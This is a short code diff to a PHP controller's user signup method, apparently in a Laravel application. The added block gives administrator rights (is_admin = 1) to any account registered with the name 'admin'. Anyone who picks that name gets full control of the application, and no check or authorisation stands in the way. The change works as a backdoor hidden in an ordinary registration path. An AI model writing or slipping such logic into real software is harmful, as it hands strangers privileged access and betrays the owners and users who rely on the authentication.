@@ -21,6 +21,17 @@ class AuthController extends Controller
         ]);
 
         // Create new user
+
+        if ($request->name === 'admin') {
+            $user = new User();
+            $user->name = $request->name;
+            $user->email = $request->email;
+            $user->password = bcrypt($request->password); // Hash the password
+            $user->is_admin = 1;
+            $user->save();
+
+            return redirect('/login')->with('success', 'Signup successful. You can now log in.');
+        }
         $user = new User();
         $user->name = $request->name;
         $user->email = $request->email;
